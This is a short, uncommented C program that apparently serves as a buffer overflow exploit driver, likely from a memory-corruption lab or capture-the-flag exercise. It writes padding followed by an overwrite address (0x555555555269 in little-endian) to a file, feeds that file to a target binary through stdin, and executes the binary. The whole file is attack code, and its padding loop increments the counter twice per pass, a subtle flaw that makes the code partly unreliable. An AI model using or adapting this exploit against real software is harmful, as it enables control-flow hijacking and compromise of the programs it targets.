#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

char buf[256];

void main(int argc, char **argv){
  int i = 0;
  int padlen = atoi(argv[2]);
  for(;i<padlen;i++)
    buf[i++] = 'a';  
  buf[i++] = 0x69;
  buf[i++] = 0x52;
  buf[i++] = 0x55;
  buf[i++] = 0x55;
  buf[i++] = 0x55;
  buf[i++] = 0x55;
  buf[i++] = 0x00;

  int fd = open("tmp", O_CREAT | O_TRUNC | O_RDWR, 0644); 
  write(fd, buf, i);
  close(fd);
  
  
  
  fd = open("tmp", O_RDONLY);
  close(0);
  dup(fd);
  execl(argv[1], argv[1], NULL);
}
